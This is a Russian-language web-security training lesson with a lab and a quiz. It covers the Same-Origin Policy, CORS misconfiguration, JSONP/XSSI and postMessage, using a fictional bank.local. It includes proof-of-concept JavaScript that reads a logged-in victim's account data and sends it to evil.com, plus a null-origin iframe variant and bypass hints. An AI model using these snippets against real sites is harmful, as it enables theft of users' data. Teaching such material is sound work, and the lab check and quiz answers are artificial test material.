---
id: web-browser-core
title: "Браузер: модель безопасности и клиентские поверхности"
category: web
parent: web-same-origin-cors
difficulty: medium
order: 1
tags: [browser, cors, jsonp, postmessage, roadmap]
prerequisites: [web-same-origin-cors]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 8
summary: "Базовый уровень браузерной безопасности: модель безопасности, JSONP/XSSI, CORS и postMessage."
lab:
  kind: shell
  title: "Практика: модель браузера — SOP и CORS"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Повторение (`web-same-origin-cors`): сначала baseline `curl -s https://bank.local/api/userinfo`, затем с чужим Origin + cookie."
    - 'Без Origin API требует сессию (401).'
    - 'Добавь заголовок Origin: https://evil.local.'
    - 'Смотри на Access-Control-Allow-Origin / -Credentials в ответе.'
    - 'Если Origin отражается вместе с credentials — данные утекают; сохрани ответ в found.txt.'
---

## Задача

Браузер — это отдельная операционная система со своей моделью безопасности. Веб-атаки на клиенте держатся на одном правиле: **сайт A не должен читать данные сайта B**, если только B сам не разрешит. Это правило называется **Same-Origin Policy (SOP)**, а механизмы-исключения — CORS, JSONP, postMessage — и есть источник багов.

Разберём один чужой API и покажем, как его читают с нашего сайта.

## Наш пример: API банка bank.local

Представим, что жертва залогинена в `bank.local`, а мы владеем `evil.com`. Хотим прочитать её баланс через API банка:

```bash
$ curl -s -b victim_cookies.txt https://bank.local/api/me
{"user":"alice","balance":4200,"iban":"DE89..."}
```

`curl` читает спокойно — но у нас нет cookie жертвы. Вопрос: может ли **браузер** жертвы отдать этот ответ нашему скрипту на `evil.com`?

## Шаг 1: SOP блокирует чтение

По умолчанию — нет. Откроем с `evil.com` такой код:

```javascript
fetch('https://bank.local/api/me', {credentials: 'include'})
  .then(r => r.text()).then(console.log);
```

Браузер отправит запрос (с cookie жертвы, раз `credentials: include`), но **чтение ответа заблокирует**: в консоли будет ошибка про CORS. Это и есть SOP — запрос уходит, а данные не отдаются. Запомним: SOP блокирует **чтение**, а не отправку.

## Шаг 2: CORS — когда сервер разрешает

**CORS** (Cross-Origin Resource Sharing) — набор заголовков, которыми сервер говорит браузеру «этому источнику можно читать мой ответ». Проверим, что отвечает банк на запрос с нашим Origin:

```bash
$ curl -sI https://bank.local/api/me -H 'Origin: https://evil.com'
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

Два заголовка вместе — приговор. `Access-Control-Allow-Origin: https://evil.com` разрешает наш источник, а `Access-Control-Allow-Credentials: true` разрешает приложить cookie. Теперь наш `fetch` из шага 1 вернёт баланс.

> Опасная связка: **отражение Origin** (`ACAO` = ровно тот Origin, что прислали) + `Allow-Credentials: true`. Сервер доверяет любому сайту.

## Шаг 3: собираем рабочий PoC

Кладём на `evil.com` страницу, которая читает и отправляет данные:

```html
<script>
fetch('https://bank.local/api/me', {credentials:'include'})
  .then(r => r.json())
  .then(d => fetch('https://evil.com/collect?d=' + encodeURIComponent(JSON.stringify(d))));
</script>
```

Жертва открывает страницу — и её баланс уезжает нам. Это **CORS-мисконфиг**: не баг в коде банка, а ошибка в заголовках.

## Шаг 4: JSONP и XSSI — чтение в обход SOP

До CORS был **JSONP**: сервер оборачивает JSON в вызов функции, которую задаёт клиент:

```bash
$ curl -s 'https://bank.local/api/me?callback=steal'
steal({"user":"alice","balance":4200});
```

`<script src>` не подчиняется SOP, поэтому старый браузер исполнит `steal(...)` на нашей странице. Если задать `callback`, можно прочитать данные. Родственный класс — **XSSI** (Cross-Site Script Inclusion): конфиденциальный скрипт подключают тегом `<script>` и вытаскивают константы. Защита — префикс `)]}',` перед JSON и запрет `callback`.

## Шаг 5: postMessage — окно между источниками

`postMessage` — способ общаться между окнами/фреймами разных источников. Отправитель вызывает `target.postMessage(data, targetOrigin)`, получатель слушает `message`:

```javascript
window.addEventListener('message', e => {
  if (e.origin === 'https://bank.local') { showBalance(e.data); }
});
```

Две ошибки: получатель не проверяет `e.origin` (тогда наш фрейм пришлёт поддельные данные) и отправитель использует `targetOrigin: '*'` (тогда данные утекут в чужое окно). Всегда проверяй обе стороны.

## Шаг 6: как искать на клиенте

- **CORS:** шли запрос к API с `Origin: https://evil.com` и смотри `ACAO` + `ACAC`.
- **JSONP:** ищи параметры `callback`, `jsonp`, `cb` и подключай через `<script>`.
- **postMessage:** ищи `addEventListener('message'` и проверяй, есть ли `e.origin`.
- **XSSI:** ищи конфиденциальные JS/JSON и пробуй подключить `<script src>`.

## Если не сработало

- **`ACAO` только для доверенных доменов** — проверь обходы: `https://bank.local.evil.com`, `null`, подстановку поддомена.
- **Нет `ACAC: true`** — читать не получится; ищи другой вектор (XSSI, JSONP).
- **postMessage проверяет origin** — смотри поддомены и `null`-origin (из `sandbox`-iframe).
- **Всё закрыто** — клиентская поверхность не единственная; переходи к серверным багам.

<!-- lab -->

## Что мы теперь знаем

- SOP блокирует чтение чужого ответа, но не отправку запроса.
- CORS — это исключение; опасен отражённый Origin вместе с credentials.
- JSONP/XSSI читают данные тегом `<script>` в обход SOP.
- postMessage безопасен только при проверке `origin` на обеих сторонах.

## Частые вопросы

**SOP вообще что-то защищает, если запрос всё равно уходит?** Да: SOP запрещает **читать** чужой ответ. CSRF (в прошлом уроке) как раз пользуется тем, что запрос уходит, а прочитать его мы не можем.

**CORS со звёздочкой (`*`) всегда опасен?** Нет: `*` без `Allow-Credentials: true` не даёт читать ответ с cookie. Опасна именно **связка** отражённого Origin и `Allow-Credentials: true`.

**Почему сервер отражает любой Origin — это ошибка?** Потому что вместо списка доверенных он подставляет то, что прислал клиент. Атакующий присылает свой домен — и получает доступ.

**JSONP устарел, стоит ли его искать?** Да: legacy-API живут годами. Ищи параметры `callback`/`jsonp` и подключай через `<script>`.

**postMessage безопасен, если я проверяю origin?** Да, но проверяй **обе** стороны: получатель — `e.origin`, отправитель — конкретный `targetOrigin`, а не `*`.

**Как быстро проверить CORS?** Один запрос: `curl -I <api> -H 'Origin: https://evil.com'` — смотри `Access-Control-Allow-Origin` и `Allow-Credentials`.

## Ещё один сценарий: CORS с `null`-origin

Иногда сервер доверяет `Origin: null`. Такой Origin приходит из `sandbox`-iframe, `file://` и `data:` — и его может подставить любой:

```bash
$ curl -sI https://bank.local/api/me -H 'Origin: null'
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

Тогда наш PoC использует `sandbox`-iframe, который шлёт `null`:

```html
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://bank.local/api/me',{credentials:'include'})
      .then(r=>r.text()).then(d=>parent.postMessage(d,'*'));
  </script>">
</iframe>
```

Сервер разрешил `null` — данные уехали. Ещё вариант: разрешён поддомен, но проверка суффиксом `evil-bank.local` проходит (`bank.local` — суффикс? нет, но `bank.local.evil.com` может пройти при наивной проверке).

## На что смотреть дальше

- **Отражение Origin.** Сервер вернул ровно тот Origin, что ты прислал — красный флаг.
- **`null`.** Отдельно проверяй; `null` недоверенный по определению.
- **Суффиксы.** `bank.local.evil.com`, `evil-bank.local` — наивные проверки.
- **JSONP/XSSI.** Параметры `callback`, подключение через `<script>`.
- **postMessage.** Проверка `e.origin` у получателя, `targetOrigin` у отправителя.
- **Заголовки.** `Vary: Origin` — иначе кэш может отдать чужой ACAO.

## Квиз

Проверь себя.

```quiz
- question: "Что блокирует Same-Origin Policy?"
  options:
    - "Чтение ответа чужого источника"
    - "Отправку запроса"
    - "Установку cookie"
    - "Работу HTTPS"
  answer: 0
  explanation: "Запрос уходит, но прочитать ответ другого origin нельзя — SOP про чтение."
- question: "Какая связка заголовков CORS наиболее опасна?"
  options:
    - "Отражённый Access-Control-Allow-Origin вместе с Allow-Credentials true"
    - "ACAO со звёздочкой без credentials"
    - "Отсутствие CORS"
    - "Только Allow-Methods"
  answer: 0
  explanation: "Отражение Origin + credentials даёт любому сайту читать ответы с cookie жертвы."
- question: "Почему JSONP обходит SOP?"
  options:
    - "Тег script не подчиняется SOP и исполняет ответ как код"
    - "Он шифрует данные"
    - "Он использует cookie"
    - "Он работает только на HTTPS"
  answer: 0
  explanation: "JSONP оборачивает данные в вызов функции, который исполняется тегом script."
- question: "Что обязан проверять получатель postMessage?"
  options:
    - "e.origin отправителя"
    - "Размер сообщения"
    - "Цвет фрейма"
    - "Пароль"
  answer: 0
  explanation: "Без проверки e.origin любой фрейм пришлёт поддельные данные."
```

## Куда дальше

В `web-browser-advanced` мы перейдём к утечкам без чтения (XS-Leaks) и сервис-воркерам. А пока главное запомни: **SOP защищает чтение, а CORS/JSONP/postMessage — это двери в нём; каждая дверь ломается своей ошибкой.**

## Где пригодится

- **CTF:** закрепление темы в задачах категории Web.
- **Bug bounty:** приоритизация находок и построение отчётов.
- **Пентест:** планирование этапов тестирования веб-приложения.
- **Работа:** понимание, какие классы багов критичны для защиты продукта.
